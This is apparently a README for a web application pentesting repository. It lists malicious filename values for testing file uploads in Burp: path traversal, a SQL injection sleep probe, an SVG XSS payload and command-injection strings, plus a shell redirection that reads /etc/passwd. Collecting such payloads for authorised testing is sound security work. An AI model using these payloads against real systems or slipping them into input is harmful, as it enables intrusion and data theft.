# webAppVulnScripts
Here is a repo of the collective vulnerability scripts used for web applications


## Parameters to include within burp
{fileName} = hello
{fileExtension} = jpg
{fileExtension} = png
{domain} = xxx.collaboraror.org


-- Try and include localhost 

### General rule
Set filename to ../../../tmp/lol.png and try to achieve a path traversal
Set filename to sleep(10)-- -.jpg and you may be able to achieve a SQL injection
Set filename to <svg onload=alert(document.domain)> to achieve a XSS
Set filename to ; sleep 10; to test some command injection --> https://book.hacktricks.xyz/pentesting-web/command-injection


### Not executed but may be interesting
```
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```

### References
https://book.hacktricks.xyz/pentesting-web/file-upload#from-file-upload-to-other-vulnerabilities
https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt
https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology
